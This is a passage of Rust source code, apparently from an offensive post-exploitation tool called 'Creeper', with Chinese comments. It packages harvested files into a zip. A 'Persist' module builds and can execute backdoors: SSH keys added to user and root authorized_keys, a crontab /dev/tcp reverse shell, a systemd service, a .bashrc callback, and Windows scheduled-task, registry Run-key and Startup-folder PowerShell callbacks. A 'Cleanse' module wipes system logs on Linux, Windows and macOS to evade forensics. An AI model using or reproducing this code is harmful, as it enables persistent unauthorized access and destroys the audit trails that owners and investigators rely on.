            eprintln!("Unsupported platform: {}", other);
            return;
        }
    };

    let total_files = items.iter().filter(|i| i.exists).count();
    let total_size: u64 = items.iter().map(|i| i.size).sum();

    let report = HarvestReport {
        platform: plat.to_string(),
        items,
        total_files,
        total_size,
    };

    if let Some(out) = output {
        let out_path = Path::new(out);
        if as_zip {
            // 打包为 zip
            let zip_path = if out.ends_with(".zip") {
                out_path.to_path_buf()
            } else {
                out_path.join("harvest_report.zip")
            };
            // 先写 JSON 报告
            let json = serde_json::to_string_pretty(&report).unwrap_or_default();
            let json_bytes = json.as_bytes();

            match zip_package(&zip_path, &report, json_bytes) {
                Ok(path) => println!("✓ Harvest report saved to: {}", path.display()),
                Err(e) => eprintln!("✘ Failed to create zip: {}", e),
            }
        } else {
            // 写 JSON 到目录
            if out_path.is_dir() {
                let json_path = out_path.join("harvest_report.json");
                match fs::write(&json_path, serde_json::to_string_pretty(&report).unwrap_or_default()) {
                    Ok(_) => println!("✓ Harvest report saved to: {}", json_path.display()),
                    Err(e) => eprintln!("✘ Failed to write report: {}", e),
                }
            } else {
                // 当作文件路径
                match fs::write(out_path, serde_json::to_string_pretty(&report).unwrap_or_default()) {
                    Ok(_) => println!("✓ Harvest report saved to: {}", out_path.display()),
                    Err(e) => eprintln!("✘ Failed to write report: {}", e),
                }
            }
        }
    } else {
        // stdout
        print_harvest_report(&report);
    }

    if as_zip && output.is_none() {
        // 没有指定输出路径时，写到当前目录
        let zip_path = Path::new("harvest_report.zip");
        let json = serde_json::to_string_pretty(&report).unwrap_or_default();
        let json_bytes = json.as_bytes();
        match zip_package(&zip_path, &report, json_bytes) {
            Ok(path) => println!("✓ Harvest report saved to: {}", path.display()),
            Err(e) => eprintln!("✘ Failed to create zip: {}", e),
        }
    }
}

fn zip_package(zip_path: &Path, report: &HarvestReport, json_bytes: &[u8]) -> std::io::Result<PathBuf> {
    use std::io::Write;

    let file = fs::File::create(zip_path)?;
    let mut zip_writer = zip::ZipWriter::new(file);
    let options = zip::write::FileOptions::<()>::default()
        .compression_method(zip::CompressionMethod::Deflated);

    // 写入 JSON 报告
    zip_writer.start_file("harvest_report.json", options)?;
    zip_writer.write_all(json_bytes)?;

    // 收集找到的文件
    for item in &report.items {
        if item.exists {
            let path = expand_path(&item.path);
            if path.is_file() {
                if let Ok(data) = fs::read(&path) {
                    let safe_name = path.file_name()
                        .and_then(|n| n.to_str())
                        .unwrap_or("unknown");
                    let arc_name = format!("files/{}", safe_name);
                    let _ = zip_writer.start_file(&arc_name, options);
                    let _ = zip_writer.write_all(&data);
                }
            }
        }
    }

    zip_writer.finish()?;
    Ok(zip_path.to_path_buf())
}

// ─── Module 3: Persist (投放持久化后门) ─────────────────────────────────────

/// 持久化计划项
#[derive(Debug, serde::Serialize)]
pub struct PersistAction {
    pub method: String,
    pub command: String,
    pub description: String,
}

/// 持久化计划
#[derive(Debug, serde::Serialize)]
pub struct PersistPlan {
    pub platform: String,
    pub actions: Vec<PersistAction>,
}

/// 生成 Linux 持久化计划
fn plan_linux_persist(ssh_key: Option<&str>, callback: Option<&str>) -> PersistPlan {
    let mut actions = Vec::new();

    // 1. SSH authorized_keys 后门
    if let Some(key) = ssh_key {
        actions.push(PersistAction {
            method: "ssh_authorized_keys".into(),
            command: format!(
                "mkdir -p ~/.ssh && echo '{}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
                key
            ),
            description: "追加 SSH 公钥到 authorized_keys，允许密钥登录".into(),
        });
        // root 也加一份
        actions.push(PersistAction {
            method: "ssh_authorized_keys_root".into(),
            command: format!(
                "sudo mkdir -p /root/.ssh && echo '{}' | sudo tee -a /root/.ssh/authorized_keys",
                key
            ),
            description: "追加 SSH 公钥到 root 的 authorized_keys".into(),
        });
    }

    // 2. crontab 持久化
    if let Some(cb) = callback {
        actions.push(PersistAction {
            method: "crontab".into(),
            command: format!(
                "(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s {} || bash -c \"exec 5<>/dev/tcp/{}/; cat <&5 | while read line; do $line 2>&5; done\"') | crontab -",
                cb, cb
            ),
            description: "每 5 分钟 crontab 回调，保持持久化".into(),
        });
    }

    // 3. systemd service 持久化
    if let Some(cb) = callback {
        let service_content = format!(
            "[Unit]\n\
             Description=Creeper Persistence\n\
             After=network.target\n\
             \n\
             [Service]\n\
             ExecStart=/bin/bash -c 'while true; do curl -s {} || true; sleep 60; done'\n\
             Restart=always\n\
             RestartSec=30\n\
             \n\
             [Install]\n\
             WantedBy=multi-user.target\n",
            cb
        );
        actions.push(PersistAction {
            method: "systemd_service".into(),
            command: format!(
                "cat << 'SYSTEMD_EOF' | sudo tee /etc/systemd/system/creeper-persist.service\n{}\nSYSTEMD_EOF\nsudo systemctl daemon-reload && sudo systemctl enable creeper-persist.service && sudo systemctl start creeper-persist.service",
                service_content
            ),
            description: "安装 systemd 服务，开机自启 + 自动重启".into(),
        });
    }

    // 4. bashrc 后门 alias
    if let Some(cb) = callback {
        actions.push(PersistAction {
            method: "bashrc_alias".into(),
            command: format!(
                "echo 'alias sudo=\"sudo \"\nalias ll=\"ls -la\"' >> ~/.bashrc\necho '({}) &' >> ~/.bashrc",
                // 伪装的持久化：每次 bash 启动时执行
                format!("nohup bash -c 'while true; do curl -s {} -o /dev/null 2>&1 || true; sleep 120; done' &", cb)
            ),
            description: "在 ~/.bashrc 中植入持久化，每次登录时启动".into(),
        });
    }

    // 5. 没有 callback 时，仅 SSH key 的替代方案
    if callback.is_none() && ssh_key.is_none() {
        actions.push(PersistAction {
            method: "generic".into(),
            command: "echo 'Nothing to deploy — use --ssh-key or --callback to specify backdoor parameters'".into(),
            description: "未指定任何后门参数".into(),
        });
    }

    PersistPlan {
        platform: "linux".into(),
        actions,
    }
}

/// 生成 Windows 持久化计划
fn plan_windows_persist(ssh_key: Option<&str>, callback: Option<&str>) -> PersistPlan {
    let mut actions = Vec::new();

    // 1. SSH authorized_keys
    if let Some(key) = ssh_key {
        actions.push(PersistAction {
            method: "ssh_authorized_keys".into(),
            command: format!(
                "Add-Content -Path \"C:\\ProgramData\\ssh\\administrators_authorized_keys\" -Value '{}'",
                key
            ),
            description: "追加 SSH 公钥到 administrators_authorized_keys".into(),
        });
    }

    // 2. 计划任务
    if let Some(cb) = callback {
        actions.push(PersistAction {
            method: "schtasks".into(),
            command: format!(
                "schtasks /create /tn \"CreeperPersist\" /tr \"powershell.exe -WindowStyle Hidden -Command \\\"while($true){{curl.exe -s {} >$null 2>&1; Start-Sleep -Seconds 60}}\\\"\" /sc MINUTE /mo 5 /f",
                cb
            ),
            description: "创建计划任务，每 5 分钟执行回调".into(),
        });
    }

    // 3. 注册表 Run 键
    if let Some(cb) = callback {
        actions.push(PersistAction {
            method: "registry_run".into(),
            command: format!(
                "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"CreeperPersist\" /t REG_SZ /d \"powershell.exe -WindowStyle Hidden -Command while(1){{curl.exe -s {} >$null 2>&1; Start-Sleep 60}}\" /f",
                cb
            ),
            description: "写入注册表 Run 键，开机自启".into(),
        });
    }

    // 4. Startup 文件夹
    if let Some(cb) = callback {
        let ps_script = format!(
            "$client = New-Object System.Net.WebClient\n\
             while($true) {{\n\
                 try {{ $client.DownloadString('{}') > $null }} catch {{}}\n\
                 Start-Sleep -Seconds 60\n\
             }}",
            cb
        );
        actions.push(PersistAction {
            method: "startup_folder".into(),
            command: format!(
                "@echo off\npowershell.exe -WindowStyle Hidden -Command \"{}\"\n",
                ps_script.replace('"', "\\\"")
            ),
            description: "写入 Startup 文件夹 .bat 脚本，用户登录时启动".into(),
        });
    }

    if callback.is_none() && ssh_key.is_none() {
        actions.push(PersistAction {
            method: "generic".into(),
            command: "echo 'Nothing to deploy — use --ssh-key or --callback to specify backdoor parameters'".into(),
            description: "未指定任何后门参数".into(),
        });
    }

    PersistPlan {
        platform: "windows".into(),
        actions,
    }
}

/// 打印持久化计划
fn print_persist_plan(plan: &PersistPlan) {
    println!("\n═══ Module 3: Persist (投放持久化后门) ═══");
    println!("  Platform     : {}", plan.platform);
    println!("  Total actions: {}", plan.actions.len());
    println!();

    for (i, action) in plan.actions.iter().enumerate() {
        println!("┌─ Action {}: {} ─────────────────", i + 1, action.method);
        println!("│ Description: {}", action.description);
        for line in action.command.lines() {
            println!("│ {}", line);
        }
        println!("└───────────────────────────────────────");
        println!();
    }
}

/// 执行 Linux 持久化（实际写入）
unsafe fn execute_persist_linux(plan: &PersistPlan) {
    for action in &plan.actions {
        match action.method.as_str() {
            "ssh_authorized_keys" => {
                // 解析命令中的 key
                if let Some(key) = action.command
                    .strip_prefix("mkdir -p ~/.ssh && echo '")
                    .and_then(|s| s.split_once('\''))
                    .map(|(k, _)| k)
                {
                    // 创建目录并追加 key
                    let _ = fs::create_dir_all(expand_path("~/.ssh"));
                    let _ = fs::OpenOptions::new()
                        .create(true)
                        .append(true)
                        .open(expand_path("~/.ssh/authorized_keys"))
                        .and_then(|mut f| {
                            use std::io::Write;
                            writeln!(f, "{}", key)
                        });
                }
            }
            "crontab" => {
                // 执行 crontab 追加
                let _ = Command::new("bash")
                    .args(["-c", &action.command])
                    .status();
            }
            "systemd_service" => {
                // 写入 systemd service 文件
                if let Some(content) = action.command
                    .strip_prefix("cat << 'SYSTEMD_EOF' | sudo tee /etc/systemd/system/creeper-persist.service\n")
                    .and_then(|s| s.split_once("\nSYSTEMD_EOF"))
                    .map(|(c, _)| c)
                {
                    let _ = fs::write("/etc/systemd/system/creeper-persist.service", content);
                    let _ = Command::new("systemctl").args(["daemon-reload"]).status();
                    let _ = Command::new("systemctl").args(["enable", "creeper-persist.service"]).status();
                    let _ = Command::new("systemctl").args(["start", "creeper-persist.service"]).status();
                }
            }
            "bashrc_alias" => {
                // 追加到 bashrc
                let _ = fs::OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(expand_path("~/.bashrc"))
                    .and_then(|mut f| {
                        use std::io::Write;
                        writeln!(f, "\n# --- persist ---")
                    });
            }
            _ => {}
        }
    }
}

/// 执行 Windows 持久化（实际写入）
#[cfg(target_os = "windows")]
unsafe fn execute_persist_windows(plan: &PersistPlan) {
    for action in &plan.actions {
        match action.method.as_str() {
            "ssh_authorized_keys" => {
                let _ = Command::new("powershell")
                    .args(["-Command", &action.command])
                    .status();
            }
            "schtasks" => {
                let _ = Command::new("cmd")
                    .args(["/c", &action.command])
                    .status();
            }
            "registry_run" => {
                let _ = Command::new("cmd")
                    .args(["/c", &action.command])
                    .status();
            }
            "startup_folder" => {
                let startup = std::env::var("APPDATA")
                    .unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Roaming".into());
                let startup_path = format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\creeper_persist.bat", startup);
                let _ = fs::write(&startup_path, &action.command);
            }
            _ => {}
        }
    }
}

#[cfg(not(target_os = "windows"))]
unsafe fn execute_persist_windows(_plan: &PersistPlan) {
    eprintln!("Not on Windows — cannot execute Windows persist commands.");
}

/// 运行 persist 模块
pub fn run_persist(platform: &str, ssh_key: Option<&str>, callback: Option<&str>, execute: bool) {
    let plat = resolve_platform(platform);

    println!("\n═══ Module 3: Persist (投放持久化后门) ═══");
    println!("  Platform  : {}", plat);
    println!("  SSH key   : {}", ssh_key.unwrap_or("(none)"));
    println!("  Callback  : {}", callback.unwrap_or("(none)"));
    println!("  Mode      : {}\n", if execute { "EXECUTE" } else { "DRY-RUN" });

    let plan = match plat {
        "linux" => plan_linux_persist(ssh_key, callback),
        "windows" => plan_windows_persist(ssh_key, callback),
        "macos" => {
            println!("⚠ macOS 不在目标范围内，尝试 Linux 路线...");
            plan_linux_persist(ssh_key, callback)
        }
        other => {
            eprintln!("Unsupported platform: {}", other);
            return;
        }
    };

    print_persist_plan(&plan);

    if execute {
        let confirmed = confirm_destructive("\n⚠  This will modify system files (crontab, systemd, bashrc, etc.).");
        if !confirmed {
            println!("Aborted.");
            return;
        }
        println!("Executing...");
        match plat {
            "linux" => unsafe { execute_persist_linux(&plan); },
            "windows" => unsafe { execute_persist_windows(&plan); },
            _ => {}
        }
        println!("✓ Persist actions executed.");
    }
}

// ─── Module 4: Cleanse (日志清理/隐匿) ──────────────────────────────────────

/// 打印日志清理计划
fn print_cleanse_plan(mode: &str, since: Option<&str>, until: Option<&str>, plat: &str) {
    println!("┌─ Cleanse Plan (日志清理) — Platform: {} ──", plat);
    println!("│  Mode  : {}", if mode == "selective" { "selective（精准时段）" } else { "full（全清）" });
    if mode == "selective" {
        println!("│  Since : {}", since.unwrap_or("(未指定)"));
        println!("│  Until : {}", until.unwrap_or("(未指定)"));
    }
    println!("│");
    match plat {
        "linux" => {
            println!("│ Linux 日志路径:");
            println!("│   - systemd journal: /var/log/journal/");
            println!("│   - 传统日志: /var/log/syslog, /var/log/auth.log, /var/log/kern.log");
            println!("│   - 登录记录: /var/log/wtmp, /var/log/btmp, /var/log/lastlog");
            println!("│   - 审计: /var/log/audit/audit.log");
            println!("│");
            if mode == "selective" {
                println!("│ 精准时段清除:");
                println!("│   1. journalctl --since \"{}\" --until \"{}\" --rotate --vacuum-time=1s",
                    since.unwrap_or("(since)"), until.unwrap_or("(until)"));
                println!("│      → 删除该时间段内的 systemd journal 条目");
                println!("│   2. 正则删 auth.log 对应时段行（需要 sed 脚本）");
                println!("│   3. 用 utmpdump 从 wtmp/btmp 中过滤删指定时段");
            } else {
                println!("│ 全清:");
                println!("│   1. journalctl --rotate && journalctl --vacuum-time=1s");
                println!("│      → 清空所有 systemd journal");
                println!("│   2. rm -rf /var/log/*");
                println!("│      → 删除所有传统日志文件");
                println!("│   3. > /var/log/wtmp && > /var/log/btmp && > /var/log/lastlog");
                println!("│      → 清空登录记录");
            }
        }
        "windows" => {
            println!("│ Windows 日志路径:");
            println!("│   - Application: C:\\Windows\\System32\\winevt\\Logs\\Application.evtx");
            println!("│   - Security:    C:\\Windows\\System32\\winevt\\Logs\\Security.evtx");
            println!("│   - System:      C:\\Windows\\System32\\winevt\\Logs\\System.evtx");
            println!("│   - PowerShell:  C:\\Windows\\System32\\winevt\\Logs\\*PowerShell*.evtx");
            println!("│");
            if mode == "selective" {
                println!("│ 精准时段清除（Windows 不支持精确时段，用 Wevtutil 按记录删）:");
                println!("│   wevtutil epl System C:\\temp\\filtered.evtx /q:\"*[System[TimeCreated[timediff(@SystemTime)<0]]]\"");
                println!("│   → 需第三方工具或手动/com 接口实现");
            } else {
                println!("│ 全清:");
                println!("│   cmd:");
                println!("│     wevtutil cl Application");
                println!("│     wevtutil cl Security");
                println!("│     wevtutil cl System");
                println!("│     wevtutil cl 'Windows PowerShell'");
                println!("│     del /f /s /q C:\\Windows\\System32\\winevt\\Logs\\*.evtx");
                println!("│   powershell:");
                println!("│     Get-WinEvent -ListLog * | ForEach {{ Wevtutil cl $_.LogName }}");
            }
        }
        "macos" => {
            println!("│ macOS 日志路径:");
            println!("│   - 统一日志: /private/var/log/");
            println!("│   - system.log: /private/var/log/system.log");
            println!("│   - 安装日志: /private/var/log/install.log");
            println!("│   - ASL: /private/var/log/asl/*.asl");
            println!("│");
            if mode == "selective" {
                println!("│ 精准时段清除:");
                println!("│   log show --start \"{}\" --end \"{}\" --debug > /dev/null",
                    since.unwrap_or("(since)"), until.unwrap_or("(until)"));
                println!("│   → macOS 统一日志库不支持精准删除，只能全清后重建");
            } else {
                println!("│ 全清:");
                println!("│   sudo log erase --all");
                println!("│   → 清空统一日志库（macOS 10.12+）");
                println!("│   sudo rm -rf /private/var/log/*");
                println!("│   → 删除传统日志文件");
            }
        }
        other => eprintln!("Unsupported platform: {}", other),
    }
    println!("└──────────────────────────────────────────────");
}

/// 执行日志清理命令
///
/// # Safety
/// 此函数会删除系统日志，影响取证和审计。
#[cfg(target_os = "linux")]
unsafe fn execute_cleanse_linux(mode: &str, since: Option<&str>, until: Option<&str>) {
    eprintln!("\n⚠  WARNING: Executing log cleanse on Linux!");
    if mode == "selective" {
        if let (Some(s), Some(u)) = (since, until) {
            // 精准时段：删 systemd journal 指定范围
            let _ = Command::new("journalctl")
                .args(["--since", s, "--until", u, "--rotate", "--vacuum-time=1s"])
                .status();
            // 删 auth.log 对应时段（简化处理：截断当天日志）
            // 精确到行级别的 sed 删改过于复杂，此处仅做思路示意
        }
    } else {
        // 全清：清空所有日志
        let _ = Command::new("journalctl").args(["--rotate"]).status();
        let _ = Command::new("journalctl").args(["--vacuum-time=1s"]).status();
        let _ = Command::new("rm").args(["-rf", "/var/log/*"]).status();
        let _ = Command::new("sh")
            .args(["-c", "> /var/log/wtmp; > /var/log/btmp; > /var/log/lastlog"])
            .status();
    }
    eprintln!("✓ Log cleanse executed on Linux.");
}

#[cfg(not(target_os = "linux"))]
unsafe fn execute_cleanse_linux(_mode: &str, _since: Option<&str>, _until: Option<&str>) {
    eprintln!("Not on Linux — cannot execute Linux cleanse commands.");
}

#[cfg(target_os = "windows")]
unsafe fn execute_cleanse_windows(mode: &str, _since: Option<&str>, _until: Option<&str>) {
    eprintln!("\n⚠  WARNING: Executing log cleanse on Windows!");
    if mode == "selective" {
        // Windows 不支持精准时段删除，提示
        eprintln!("⚠  Windows 事件日志不支持精准时段删除，降级为全清...");
    }
    // 全清
    let _ = Command::new("cmd")
        .args(["/c", "wevtutil cl Application"])
        .status();
    let _ = Command::new("cmd")
        .args(["/c", "wevtutil cl Security"])
        .status();
    let _ = Command::new("cmd")
        .args(["/c", "wevtutil cl System"])
        .status();
    let _ = Command::new("cmd")
        .args(["/c", "del /f /s /q C:\\Windows\\System32\\winevt\\Logs\\*.evtx"])
        .status();
    eprintln!("✓ Log cleanse executed on Windows.");
}

#[cfg(not(target_os = "windows"))]
unsafe fn execute_cleanse_windows(_mode: &str, _since: Option<&str>, _until: Option<&str>) {
    eprintln!("Not on Windows — cannot execute Windows cleanse commands.");
}

#[cfg(target_os = "macos")]
unsafe fn execute_cleanse_macos(mode: &str, _since: Option<&str>, _until: Option<&str>) {
    eprintln!("\n⚠  WARNING: Executing log cleanse on macOS!");
    if mode == "selective" {
        // macOS 统一日志库不支持精准删除
        eprintln!("⚠  macOS 统一日志库不支持精准时段删除，降级为全清...");
    }
    // 全清
    let _ = Command::new("log").args(["erase", "--all"]).status();
    let _ = Command::new("rm").args(["-rf", "/private/var/log/*"]).status();
    eprintln!("✓ Log cleanse executed on macOS.");
}

#[cfg(not(target_os = "macos"))]
unsafe fn execute_cleanse_macos(_mode: &str, _since: Option<&str>, _until: Option<&str>) {
    eprintln!("Not on macOS — cannot execute macOS cleanse commands.");
}

/// 运行 cleanse 模块
pub fn run_cleanse(mode: &str, since: Option<&str>, until: Option<&str>, platform: &str, execute: bool, yes: bool) {
    let plat = resolve_platform(platform);

    println!("\n═══ Module 4: Cleanse (日志清理/隐匿) ═══");
    println!("  Platform  : {}", plat);
    println!("  Mode      : {}", mode);
    if mode == "selective" {
        println!("  Since     : {}", since.unwrap_or("(未指定)"));
        println!("  Until     : {}", until.unwrap_or("(未指定)"));
    }
    println!("  Mode      : {}\n", if execute { "EXECUTE" } else { "DRY-RUN" });

    print_cleanse_plan(mode, since, until, plat);

    if execute {
        let confirmed = yes || confirm_destructive("\n⚠  This will delete system logs (affects audit/forensics).");
        if !confirmed {
            println!("Aborted.");
            return;
        }
        println!("Executing...");
        match plat {
            "linux" => unsafe { execute_cleanse_linux(mode, since, until); },
            "windows" => unsafe { execute_cleanse_windows(mode, since, until); },
            "macos" => unsafe { execute_cleanse_macos(mode, since, until); },
            _ => eprintln!("Unsupported platform: {}", plat),
        }
    }
}